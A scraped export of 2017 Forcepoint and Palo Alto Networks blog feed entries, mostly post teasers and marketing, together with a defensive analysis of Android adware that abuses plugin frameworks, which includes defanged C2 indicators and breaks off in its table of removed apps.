A Tale of Two Crypters,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>In early March 2017 we saw a surge in malware samples with similar behaviours and low detection rates, often triggering only generic and/or heuristic antivirus signatures. Examining these revealed them to be samples of the venerable njRAT Trojan (also known as Bladabindi) and, unsurprisingly, shows their post-infection behaviour and capabilities to align with known njRAT patterns (keylogging, screen-capturing, etc.)</p>
<p>	Two samples were examined in particular: both of these downloaded a sizeable 'blob' from Pastebin and communicated with C2s hosted on domains associated with dynamic DNS services - typical features of njRAT campaigns dating back several years. However, as it turns out, despite being two different versions of the same malware and even having compilation timestamps within a day of each other, the obfuscation methods used by the samples are quite different.</p>
</div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/security-labs/tale-two-crypters"" rel=""tag"" title=""A Tale of Two Crypters"">Read more<span class=""element-invisible""> about A Tale of Two Crypters</span></a></li>
</ul>",https://blogs.forcepoint.com/security-labs/tale-two-crypters
Millennials in the Machine,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p><strong><img alt="""" class=""center"" src=""https://blogs.forcepoint.com/sites/default/files/u361/mel_fed.jpg"" /></strong></p>
<p>	<strong>The Growing Cultural Impact of Millennials in the Federal Workforce </strong></p></div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/insights/millennials-machine"" rel=""tag"" title=""Millennials in the Machine"">Read more<span class=""element-invisible""> about Millennials in the Machine</span></a></li>
</ul>",https://blogs.forcepoint.com/insights/millennials-machine
Tax-themed Threats Continue to Spread during the Tax Season,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>Since late last year, multiple warnings have been issued to the public regarding tax-related fraud campaigns. Forcepoint Security Labs™ have observed a similar trend in its telemetry where small to medium-sized tax-themed email campaigns have constantly appeared since the start of this year. This report details the findings of Forcepoint Security Labs™.</p>
</div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/security-labs/tax-themed-threats-continue-spread-during-tax-season"" rel=""tag"" title=""Tax-themed Threats Continue to Spread during the Tax Season"">Read more<span class=""element-invisible""> about Tax-themed Threats Continue to Spread during the Tax Season</span></a></li>
</ul>",https://blogs.forcepoint.com/security-labs/tax-themed-threats-continue-spread-during-tax-season
Forcepoint Ranks #3 in Cybersecurity Ventures Cybersecurity 500,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p><img alt="""" class=""center"" src=""https://blogs.forcepoint.com/sites/default/files/u361/cybersecurity_500.jpg"" /></p></div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/2017Cybersecurity500"" rel=""tag"" title=""Forcepoint Ranks #3 in Cybersecurity Ventures Cybersecurity 500"">Read more<span class=""element-invisible""> about Forcepoint Ranks #3 in Cybersecurity Ventures Cybersecurity 500</span></a></li>
</ul>",https://blogs.forcepoint.com/2017Cybersecurity500
The 21st Century 49ers: Small-time Cryptocurrency Mining,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>Forcepoint™ Security Labs frequently identify new, unusual, or otherwise interesting pieces of malware. Sometimes these turn out to be elements of large, APT-driven campaigns (e.g. our report into the MONSOON campaign from August 2016: <a href=""https://blogs.forcepoint.com/security-labs/monsoon-analysis-apt-campaign"" rel=""nofollow"">https://blogs.forcepoint.com/security-labs/monsoon-analysis-apt-campaign</a>); other times these can be more 'niche', as is the case with this miniature Monero mining botnet.</p>
</div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/security-labs/21st-century-49ers-small-time-cryptocurrency-mining"" rel=""tag"" title=""The 21st Century 49ers: Small-time Cryptocurrency Mining"">Read more<span class=""element-invisible""> about The 21st Century 49ers: Small-time Cryptocurrency Mining</span></a></li>
</ul>",https://blogs.forcepoint.com/security-labs/21st-century-49ers-small-time-cryptocurrency-mining
Bitcoin & Other Cryptocurrencies,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>For many, ‘virtual’ currencies such as Bitcoin remain a mystery primarily associated with online criminals, despite no longer being far removed from the monetary system and transactions we’re used to.</p>
<p>	This article is intended to serve as a primer, rather than one of our more usual technical analyses: cryptocurrencies continue to play a key role in many areas of cyber-crime being used for everything from online marketplace transactions to ransomware demands. However, with a number of legitimate organisations ranging from the Bank of England to EY also taking an interest cryptocurrencies and the technologies behind them, it’s worth being informed.</p>
</div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/security-labs/bitcoin-other-cryptocurrencies"" rel=""tag"" title=""Bitcoin &amp; Other Cryptocurrencies"">Read more<span class=""element-invisible""> about Bitcoin &amp; Other Cryptocurrencies</span></a></li>
</ul>",https://blogs.forcepoint.com/security-labs/bitcoin-other-cryptocurrencies
SHAttered - A SHA-1 Hash Collision,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>Researchers at <a href=""https://research.google.com/teams/spa/"">Google</a> and <a href=""https://www.cwi.nl/research-groups/Cryptology"">CWI</a> have been the first to create a practical collision attack against the SHA-1 cryptographic hash function.  Previously a collision was only possible in theory with the premise that a significant amount of computing power would be necessary to generate a collision.  Now it seems as though that computing power has been harnessed by the team who have named the collision issue “SHAttered”.</p>
<p>	 </p>
<p>	Cryptographic hash functions such as <a href=""https://en.wikipedia.org/wiki/SHA-1"">SHA-1</a> are used extensively in applications of data integrity and data storage.  Some applications rely on a cryptographic hash function being collision-resistant, others that it is not possible to generate the input from only knowing the hash.</p>
</div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/security-labs/shattered-sha-1-hash-collision"" rel=""tag"" title=""SHAttered - A SHA-1 Hash Collision"">Read more<span class=""element-invisible""> about SHAttered - A SHA-1 Hash Collision</span></a></li>
</ul>",https://blogs.forcepoint.com/security-labs/shattered-sha-1-hash-collision
Forcepoint Closes Deal to Acquire Imperva Skyfence,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>As of February 23, 2017, we’ve successfully closed on the <a href=""https://www.forcepoint.com/newsroom/2017/forcepoint-acquires-skyfence-extend-its-leadership-cloud-security-data-leakage"">acquisition of Imperva’s Skyfence product line</a>, now known as Forcepoint CASB (Cloud Access Security Broke</p></div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/insights/forcepoint-closes-deal-acquire-imperva-skyfence"" rel=""tag"" title=""Forcepoint Closes Deal to Acquire Imperva Skyfence"">Read more<span class=""element-invisible""> about Forcepoint Closes Deal to Acquire Imperva Skyfence</span></a></li>
</ul>",https://blogs.forcepoint.com/insights/forcepoint-closes-deal-acquire-imperva-skyfence
Detecting Register-Hooking Linux Rootkits with Forcepoint Second Look,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>
	Sometimes old threats continue to remain relevant for a long period of time. The longevity of the x86 CPU architecture means that rootkits leveraging its features to achieve stealth on compromised systems may have a long shelf life and enable attackers to evade detection over an extended period. In this article, we look at “Subversive” (<a href=""https://github.com/falk3n/subversive"">https://github.com/falk3n/subversive</a>), a Linux rootkit that uses x86 debug registers to hook the operating system kernel.</p>
</div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/security-labs/detecting-register-hooking-linux-rootkits-forcepoint-second-look"" rel=""tag"" title=""Detecting Register-Hooking Linux Rootkits with Forcepoint Second Look"">Read more<span class=""element-invisible""> about Detecting Register-Hooking Linux Rootkits with Forcepoint Second Look</span></a></li>
</ul>",https://blogs.forcepoint.com/security-labs/detecting-register-hooking-linux-rootkits-forcepoint-second-look
RSA Conference 2017: Day Three,"<div class=""field field-name-body field-type-text-with-summary field-label-hidden""><div class=""field-items""><div class=""field-item even""><p>On the last full day of RSA, <a href=""https://www.forcepoint.com/company/biographies/matthew-p-moynahan"">Forcepoint CEO Matt Moynahan </a>delivered a keynote on the importance of breaking from a focus on endpoints and walls to the critical <a href=""https://www.forcepoint.com/protecting-human-poin&lt;/body&gt;&lt;/html&amp;gt""></a></p></div></div></div><ul class=""links inline""><li class=""node-readmore first last""><a href=""https://blogs.forcepoint.com/RSAConference2017DayThree"" rel=""tag"" title=""RSA Conference 2017: Day Three"">Read more<span class=""element-invisible""> about RSA Conference 2017: Day Three</span></a></li>
</ul>",https://blogs.forcepoint.com/RSAConference2017DayThree
"Palo Alto Networks News of the Week – March 25, 2017","<p>Did you miss any of this week’s Palo Alto Networks action? Don’t worry &#8212; we’ve rounded up our top news and views right here:</p>
<ul>
<li>We’re pleased to share that Palo Alto Networks received <a href=""http://researchcenter.paloaltonetworks.com/2017/03/palo-alto-networks-receives-2016-google-cloud-global-partner-award-solution-innovation/"">the 2016 Google Cloud Global Partner Award for Solution Innovation</a>, which recognizes contributions to Google Cloud solutions.</li>
<li>The Unit 42 Threat Intelligence team shared new research:
<ul>
<li><a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-new-trend-android-adware-abusing-android-plugin-frameworks/"">A New Trend in Android Adware: Abusing Android Plugin Frameworks</a></li>
<li><a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-new-white-paper-preventing-credential-phishing-theft-abuse/"">New White Paper on Preventing Credential Phishing, Theft and Abuse</a></li>
</ul>
</li>
<li>The <a href=""http://researchcenter.paloaltonetworks.com/2017/03/gearing-collegiate-cyber-defense-competition/"">Collegiate Cyber Defense Competition</a> is back! We shared the details of this year’s event.</li>
<li>Palo Alto Networks <a href=""http://researchcenter.paloaltonetworks.com/2017/03/grab-seat-ignite-17-session-builder-open/"">Ignite ’17 session builder</a> is now live! Grab your seat today.</li>
<li>Next-gen drive: <a href=""http://researchcenter.paloaltonetworks.com/2017/03/next-gen-drive-rob-megennis-wins-big-st-petersburg-grand-prix/"">Rob Megennis wins BIG at St. Petersburg Grand Prix</a>. Check out the highlights below.  </li>
</ul>
<p>Have you registered for <a href=""http://go.paloaltonetworks.com/ignite2017"">Palo Alto Networks Ignite 2017</a>? Join over 4,000 security professionals in Vancouver for the most exciting cybersecurity conference of the year! Grab your seat at one of our many <a href=""https://ignite.paloaltonetworks.com/forms/regform.html?referer=null&amp;utm_medium=social-owned-promo&amp;utm_source=Social+Media"">hands-on sessions</a> and take your cybersecurity skills to the next level!</p>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p>Take a look at <a href=""http://events.paloaltonetworks.com/"">upcoming events</a> around the world that you should know about. Don’t forget to register for our <a href=""https://signup.paloaltonetworks.com/ehome/event-calendar"">events calendar</a>!</p>
<p><a href=""https://signup.paloaltonetworks.com/ehome/233761"">Palo Alto Networks Security Summit</a></p>
<ul>
<li>March 28, 2017</li>
<li>Rishon Lezion West, Israel</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/236144"">Ultimate Test Drive – Traps</a></p>
<ul>
<li>March 28, 2017</li>
<li>Melbourne, Australia</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/224666"">NGFW: Next Generation Firewall Live Demo</a></p>
<ul>
<li>March 29, 2017</li>
<li>Online</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/237899"">Security’s Colossal Event – Cambodia</a></p>
<ul>
<li>March 30, 2017</li>
<li>Phnom Penh, Cambodia</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/237899"">Exploits &amp; Malware Revealed</a></p>
<ul>
<li>March 30, 2017</li>
<li>Irvine, CA</li>
</ul>
<p><a href=""http://go.paloaltonetworks.com/Predictions033017"">2017 Cybersecurity Predictions Leadership Webinar</a></p>
<ul>
<li>March 30, 2017</li>
<li>Online</li>
</ul>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/palo-alto-networks-news-week-march-25-2017/"" rel=""nofollow"">Palo Alto Networks News of the Week – March 25, 2017</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/EHhP7vNwmJM"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/EHhP7vNwmJM/
"Channel Scoop – March 24, 2017","<p>Sit back and relax while we bring you this week’s channel scoop.</p>
<ul>
<li><strong>Q3 NextWave Huddle Replay &amp; Presentation</strong>: In Q3 we changed the format of our Worldwide Channels Quarterly NextWave Huddle, adding regional partner wins. If you missed your regional NextWave Huddle, we recommend watching the replay and reviewing the presentation:
<ul>
<li>Americas/EMEA <a href=""http://players.brightcove.net/1050259881001/default_default/index.html?videoId=5362168632001"">replay</a> and <a href=""https://www.paloaltonetworks.com/content/dam/pan/en_US/partners/nextwave/82798/q3-fy17-ams-emea-huddle.pdf"">presentation</a></li>
<li>APAC/Japan<a href=""http://players.brightcove.net/1050259881001/default_default/index.html?videoId=5363501690001""> replay</a> and<a href=""https://www.paloaltonetworks.com/content/dam/pan/en_US/partners/nextwave/82798/q3-fy17-apac-japan-huddle-notes.pdf""> presentation</a></li>
</ul>
</li>
</ul>
<ul>
<li><strong>Date Change – Traps Competitive Sales Insight Webinar</strong>: <a href=""https://www.paloaltonetworks.com/partners/nextwave-partner-portal/help-me-learn/insight-webinars"">Register today</a> for our webinar on April 12, at 8AM PST / 3:00PM BST / 4:00 PM CEST to learn how to win deals against legacy anti-virus endpoint vendors.</li>
</ul>
<ul>
<li><strong>Sales Insight Webinar: Positioning the Public Cloud Opportunity: </strong><a href=""https://www.paloaltonetworks.com/partners/nextwave-partner-portal/help-me-learn/insight-webinars"">Register today</a> for one of two sessions on April 25 at 8:00 AM PST / 3:00PM BST / 4:00 PM CEST or at 6:00 PM PST / 9:00 AM SGT (April 26) / 10:00 AM JST (April 26). In this session, you will learn how and why to position Palo Alto Networks relative to the Public Cloud.</li>
</ul>
<ul>
<li><strong>Partner Growth Blueprint: </strong>Last year, 26 partners doing more than $1 million in Palo Alto Networks business with us grew 100 percent. Want to learn how? The secrets to success are unveiled in the <a href=""https://www.paloaltonetworks.com/content/dam/pan/en_US/partners/marketing/Infographics/PAN-BlueprintforGrowth-infographic-final.pdf"">Partner Growth Blueprint infographic</a>.</li>
</ul>
<ul>
<li><strong>EMEA Partner On Boarding</strong>: Next course is June 6-8, 2017 in London. Learn more and <a href=""https://www.paloaltonetworks.com/content/dam/pan/en_US/partners/nextwave/emea/partner-onboarding-announcement.pdf"">register today</a>.</li>
</ul>
<p>*To access content on the Partner Portal you must be a Palo Alto Networks NextWave channel partner and have a valid user name and password. Email <a href=""mailto:NextWave@paloaltonetworks.com"">NextWave@paloaltonetworks.com</a> to request Partner Portal access.</p>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite ’17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/partner-channel-scoop-march-24-2017/"" rel=""nofollow"">Channel Scoop – March 24, 2017</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/TwHrQERHf9Q"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/TwHrQERHf9Q/
Palo Alto Networks Receives 2016 Google Cloud Global Partner Award for Solution Innovation,"<p>We recently sponsored Google Next, collaborating with Google to demonstrate how our virtualized next-generation firewall can enhance enterprise security for users of the Google Cloud Platform (GCP).</p>
<p>We’re also pleased to share that Palo Alto Networks received the 2016 Google Cloud Global Partner Award for Solution Innovation, which recognizes contributions to Google Cloud solutions. Here’s a great scene from the Google Partner Summit awards ceremony.</p>
<p><img alt=""partner-summit_att-69"" class=""alignnone size-full wp-image-25692"" height=""428"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Partner-Summit_ATT-69.jpg"" width=""640"" /></p>
<p>For more, see <a href=""https://blog.google/topics/google-cloud/google-cloud-partner-awards-recognizing-customer-success-and-solution-innovation/"">Google Cloud’s blog post on the 2016 award winners</a>.</p>
<p>Interested to learn more about our work with GCP? Please work with your Palo Alto Networks representative to schedule a follow-up conversation.</p>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite ’17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/palo-alto-networks-receives-2016-google-cloud-global-partner-award-solution-innovation/"" rel=""nofollow"">Palo Alto Networks Receives 2016 Google Cloud Global Partner Award for Solution Innovation</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/9PQ-cp0SeQ4"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/9PQ-cp0SeQ4/
Grab a Seat: Ignite ‘17 Session Builder Is Open,"<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p>The <strong>Ignite ‘17 Session Builder</strong> is now open to event attendees! Popular sessions, such as hands-on workshops and Ultimate Test Drives, fill up fast so be sure to snag a seat while you can.</p>
<p><strong><a href=""http://go.paloaltonetworks.com/ignite2017"">Register now for Ignite ’17 Security Conference to access the Session Builder.</a></strong></p>
<p><strong>Ignite ’17 Security Conference: Vancouver, BC June 12–15, 2017<br />
</strong>Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/grab-seat-ignite-17-session-builder-open/"" rel=""nofollow"">Grab a Seat: Ignite ‘17 Session Builder Is Open</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/nwUIRzegEX0"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/nwUIRzegEX0/
A New Trend in Android Adware: Abusing Android Plugin Frameworks,"<p>It is common for legitimate mobile apps to embed advertising SDKs or promote other apps. Showing ads or promoting other apps can generate revenue for legitimate app developers. However, we have recently observed an alarming trend in mobile ads communities where some adware programs in the Google Play store have become more aggressive by abusing the third-party <a href=""https://github.com/DroidPluginTeam/DroidPlugin"">DroidPlugin framework</a> on Android.</p>
<p>In this posting we will outline how Unit 42 researchers have found aggressive adware that abuses the third-party <a href=""https://github.com/DroidPluginTeam/DroidPlugin"">DroidPlugin framework</a> on Android. Our researchers have worked with Google to share our findings and have all apps that were found to violate Google’s terms of service removed from the Google Play store.</p>
<h3>The “Good” and “Bad” of Android Plugin Technology</h3>
<p>Plugin technology was initially introduced by third parties to add additional enhancements and capabilities to Android. For instance, <a href=""https://play.google.com/store/apps/details?id=com.lbe.parallel.intl&amp;hl=en"">Parallel Space</a> allows a user to run two Twitter apps on one phone. Plugin technology can also improve the speed of hot patching.</p>
<p>Unfortunately, the enhancements and capabilities that plugin technology offers can be used for malicious ends. Malware authors have been abusing legitimate Plugin technology to achieve ends like bypassing antimalware technology on devices, especially the static scanners. We’ve discussed this already in our research on <a href=""http://researchcenter.paloaltonetworks.com/2016/11/unit42-pluginphantom-new-android-trojan-abuses-droidplugin-framework/"">PluginPhantom</a>. Other researchers have discussed how this technology can be abused for <a href=""https://blog.avast.com/malware-posing-as-dual-instance-app-steals-users-twitter-credentials"">phishing attacks</a>.</p>
<p>Previously research has found malware have abusing the most popular open source plugin frameworks, “DroidPlugin” and “VirtualApp”. Both frameworks can launch arbitrary Android apps, theoretically without them being installed on the phone. Technically, the Android plugin technology is an application-level virtualization environment.</p>
<p>Unit 42 researchers have recently found how Android plugin functionality has become an innovative way to promote apps through adware. A plugin-enabled app has the ability to automatically launch different apps without installing them. This provides a shortcut for adware to make revenue from ad networks as the promoted app can be launched on without any user interaction.</p>
<p>This type of app promotion can post security risks because of the comparatively weak security mechanisms used in current plugin frameworks. These plugin frameworks lack the ability to separate permissions and isolate data amongst different plugin instances. Thus, when a promoted app is executed through the plugin framework, it has the same permissions as the host app (typically all Android permissions) and can access the data of the host app or other plugin apps. This violates an important aspect of Android Application Sandbox:</p>
<p style=""padding-left: 30px;"">“The Android Application Sandbox, which isolates your app data and code execution from other apps.”</p>
<p>Legitimate apps that assume they will always be running in their own application sandbox are now at risk because they cannot predict if their app will be launched in a plugin environment.</p>
<p>For example, in Google Play, we have observed that 32 apps use the DroidPlugin framework, and 21 apps use the VirtualApp framework. Most of them are PUPs (potentially unwanted programs) or adware, which have been removed from Google Play (listed below in the appendix).</p>
<p>In the following examples, we will demonstrate how two adware families abuse plugin technology in the new app promotion style.</p>
<h3>Example 1: Automated and Aggressive App Promotion</h3>
<p>In September 2016, the developers of an app named “Clean Doctor” (package name: “com.nianclub.cleandoctor”) made it more aggressive in version 1.2.0. This adware abuses the VirtualApp framework. Its evolution timeline in Google Play is showed in Figure 1.</p>
<p><a href=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_1.png""><img alt=""newtrend_1"" class=""alignnone size-full wp-image-25551"" height=""98"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_1.png"" width=""940"" /></a></p>
<p><em>Figure 1 Evolution timeline of “Clean Doctor”</em></p>
<p><strong>Clean Doctor vs other Adware:</strong></p>
<p>To promote apps, adware commonly downloads apps and then frequently displays the app installation GUI to the user. After users have installed the app, the adware creator receives a payment for “promoting” the new app. Clean Doctor (CD) took a different tactic to accomplish the same goal.</p>
<p>CD fetches task information from its C2 server “familysdk[.]com” and stealthily downloads many promoted apps from a cloud storage service. It does not request users install these downloaded apps but instead launches the apps one of two different ways:</p>
<p><strong>1. Launch by clicking the shortcut:</strong><br />
CD creates shortcuts on the devices’ home screen for each downloaded app (Figure 2). When the user clicks the shortcut, it launches the corresponding app as a plugin app in the “Clean Doctor” sandbox. For most Android users, it is very difficult to notice the difference between this kind of launch and the default launch mode when clicking a shortcut. For example, when a user clicks the shortcut of the game “Evony: Battle On”, this game will be directly and immediately displayed but the game is actually launched as a plugin app and is running in the plugin virtual environment.</p>
<p style=""text-align: center;""><a href=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_2.png""><img alt=""newtrend_2"" class=""size-full wp-image-25554 aligncenter"" height=""650"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_2.png"" width=""365"" /></a><em>Figure 2 Created shortcuts of promoted apps</em></p>
<p><strong>2. Automatically launch:</strong><br />
As all plugin apps are under the full control by the host app, the host app can control the lifecycle of each plugin app. CD can automatically launch the promoted app as a plugin app when receiving system events.</p>
<p style=""text-align: center;""><a href=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_3.png""><img alt=""newtrend_3"" class=""size-full wp-image-25557 aligncenter"" height=""623"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_3.png"" width=""351"" /></a><em>Figure 3 A promoted game app is launched as a plugin</em></p>
<h3>Example 2: Multiple Apps Promotion</h3>
<p>At the end of January 2017, we observed that developers of an adware app in Google Play called “bloodpressure” (package name: “<em>com.blood.pressure.bost”)</em> had also made it more aggressively promote apps by abusing the Android plugin technology. This adware automatically launches a separate app to display ads and recommends multiple apps in a single screen.</p>
<p>The adware started using the embedded VirtualApp framework with version 2.5, but it was removed Google Play at the start of February 2017. At the time of its removal it’s installation count was between 10,000 and 50,000 installs. The lifecycle of this adware in Google Play is shown in Figure 4.</p>
<p><a href=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_4.png""><img alt=""newtrend_4"" class=""alignnone size-full wp-image-25560"" height=""130"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_4.png"" width=""833"" /></a></p>
<p><em>Figure 4 Timeline of evolution to plugin adware for “bloodpressure” app</em></p>
<p><strong>Compared to Other Adware</strong></p>
<p>Most advertising SDKs use the webview component to display ads such as banner ads and full screen ads. Apps built using these SKDs can only display one ad at a time. The bloodpressure adware sample we found is different and can display advertisements for many apps to the user on a single screen. To achieve this, the adware automatically launches a plugin app, in which many ads are displayed together (Figure 5).  This technique is not as harmful as simply launching promoted apps without the user’s interaction, but does allow the adware author more opportunities to have a promoted app installed.</p>
<p style=""text-align: center;""><a href=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_5.png""><img alt=""newtrend_5"" class=""size-full wp-image-25563 aligncenter"" height=""598"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_5.png"" width=""359"" /></a><em>Figure 5 The plugin app displays multiple ads</em></p>
<h3>Technical Analysis</h3>
<p>The workflow of this adware is depicted in Figure 6, and is explained as follows.</p>
<p><strong>1. Get configuration from the remote server:<em><br />
</em></strong>Once the host app launched, it connects to the remote server via the URL <em>http[:]//qwe.ortpale[.]com/conf/bloodinfo.txt </em>to get a configuration file. It is interesting to note that the User-Agent property in the HTTP request header is set to “<em>Ray-Downer.”</em></p>
<p><strong>2. Decode and save plugin app<em><br />
</em></strong>The host app includes a raw resource named “<em>protect.data”. </em>This resource file is actually an encoded plugin APK file. The host app decodes this file and saves it.</p>
<p><strong>3. Install plugin app<em><br />
</em></strong>The host app takes advantage of VirtualApp framework to install the plugin app within the host app’s own sandbox.</p>
<p><strong>4. Launch plugin app<br />
</strong>After installing the plugin app successfully, the host app can launch the plugin via invoking VirutalApp’s API. Once the plugin app starts, it begins displaying adds to the user.</p>
<p style=""text-align: center;""><a href=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_6.png""><img alt=""newtrend_6"" class=""size-full wp-image-25566 aligncenter"" height=""800"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/Newtrend_6.png"" width=""577"" /></a><em>Figure 6 Plugin Adware Operation</em></p>
<h3>Conclusion</h3>
<p>The Android plugin technology makes it possible for adware authors to make a profit in a new way. This kind of abuse is harmful to ad networks as well as Android users. We hope that the mobile development community and the security community will work together to solve security problems in the Android Plugin technology.  Android users should learn that the private data of their plugin apps and their devices are at great risk when operating in an Android Plugin environment.</p>
<p>Customers of Palo Alto Networks are protected by our WildFire and URL filtering services. WildFire has successfully detected adware samples, which abuse the Android plugin technology. The related C2 URLs used by above two adware families have been marked as malicious.</p>
<h3>Acknowledgement</h3>
<p>We greatly appreciate the help from Ryan Olson and Kirill Zemnucha from Palo Alto Networks in working on this the blog publication and the original discovery of adware samples.</p>
<h3>Other Removed Plugin Apps in Google Play</h3>
<table style=""height: 1092px;"" width=""862"">
<tbody>
<tr>
<td width=""153""><strong>App Name</strong></td>
<td width=""181""><strong>Package name</strong></td>
<td width=""116""><strong>Developer name</strong></td>
</tr>
<tr>
<td width=""153"">Whale Camera</td>
<td width=""181"">com.bird.sky.whale.camera</td>
<td width=""116"">yu tongshi</td>
</tr>
<tr>
<td width=""153"">Deep Cleaner</td>
<td width=""181"">com.blue.deep.cleaner</td>
<td width=""116"">yang songxi</td>
</tr>
<tr>
<td width=""153"">Ice Camera</td>
<td width=""181"">com.cool.ice.camera</td>
<td width=""116"">mo tengbao</td>
</tr>
<tr>
<td width=""153"">Sweet Camera</td>
<td width=""181"">com.filter.sweet.camera</td>
<td width=""116"">hou hanying</td>
</tr>
<tr>
<td width=""153"">Orange Camera</td>
<td width=""181"">com.fishing.when.orangecamera</td>
<td width=""116"">chen shunya</td>
</tr>
<tr>
<td width=""153"">穿越VPN</td>
<td width=""181"">com.fvcorp.ffclient.cs</td>
<td width=""116"">林曦</td>
</tr>
<tr>
<td width=""153"">Funny Camera</td>
